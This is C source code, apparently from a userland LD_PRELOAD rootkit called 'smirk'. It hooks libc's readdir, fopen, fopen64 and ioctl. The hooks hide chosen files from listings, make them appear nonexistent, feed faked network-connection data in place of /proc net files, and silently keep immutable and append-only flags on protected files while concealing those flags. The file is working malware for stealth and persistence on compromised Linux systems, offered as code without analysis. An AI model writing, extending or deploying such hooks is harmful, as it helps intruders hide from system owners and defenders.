#include "smirk.h"
#include "utils.h"

void __attribute ((constructor))
init(void)
{
    #ifdef DEBUG
    printf("[-] constructor\n");
    #endif
}

__attribute__((destructor))
void end (void) {
    #ifdef DEBUG
    printf("[-] destructor\n");
    #endif
}

void *load_libc(char *funcname){
    if (!libc) {
        libc=dlopen(LIBC, RTLD_LAZY);
    }
    return dlsym(libc, funcname);
}

struct dirent *readdir(DIR *dirp)
{
    #ifdef DEBUG
    printf("[-] hooking readdir\n");
    #endif

	if(!hooked_readdir){
		hooked_readdir = load_libc("readdir");
	}

    struct dirent *dir;
    dir = hooked_readdir(dirp);
    
    if(dir == NULL){
        return NULL;
    }

    char filename[PATH_MAX];
    int i;
    for (i = 0; dir->d_name[i] != '\0'; i++){
        filename[i] = dir->d_name[i];
    }
    filename[i] = '\0';
    
    if(is_magicfile(filename)){
        #ifdef DEBUG
        printf("[+] Hiding %s\n",filename);
        #endif
        for (int x = 0; x <= i; x++){
            dir->d_name[x] = '\0';
        }
        return readdir(dirp);
    }

    return dir;
}

FILE *fopen(const char *pathname, const char *mode)
{
    #ifdef DEBUG
    printf("[-] hooking fopen\n");
    #endif

	if(!hooked_fopen){
		hooked_fopen = 	load_libc("fopen");
	}

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(hooked_fopen, real_pathname, newfile)){
            return NULL;
        }
        return hooked_fopen(newfile, mode);
    } else if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return NULL;
    }

	return hooked_fopen(real_pathname, mode);
}


FILE *fopen64(const char *pathname, const char *mode)
{
	#ifdef DEBUG
    printf("[-] hooking fopen64\n");
    #endif

    if(!hooked_fopen64){
		hooked_fopen64 = load_libc("fopen64");
	}

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(hooked_fopen64, real_pathname, newfile)){
            return NULL;
        }
	    return hooked_fopen64(newfile, mode);
    } else if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return NULL;
    }
 
	return hooked_fopen64(real_pathname, mode);
}

int is_flag_set(int fd, unsigned long flags){
    unsigned long argp;

    if(!hooked_ioctl){
		hooked_ioctl = load_libc("ioctl");
	}

    int rc = hooked_ioctl(fd, FS_IOC_GETFLAGS, &argp);
    if (rc != -1){
        argp = argp & flags;
        if (argp){
            return argp == flags;
        }
        return 0;
    }
    return 0;
}

int ioctl(int fd, unsigned long request, unsigned long *argp){
    #ifdef DEBUG
    printf("[-] hooking ioctl\n");
    #endif

    if(!hooked_ioctl){
		hooked_ioctl = load_libc("ioctl");
	}

    unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
    if (is_flag_set(fd, flags)){
        if (request == FS_IOC_SETFLAGS){
            *argp = *argp | flags;
            return hooked_ioctl(fd, request, argp);
        } else if (request == FS_IOC_GETFLAGS){
            int rc = hooked_ioctl(fd, request, argp);
            *argp = *argp &~ flags;
            return rc;
        }
    }

    return hooked_ioctl(fd, request, argp);
}
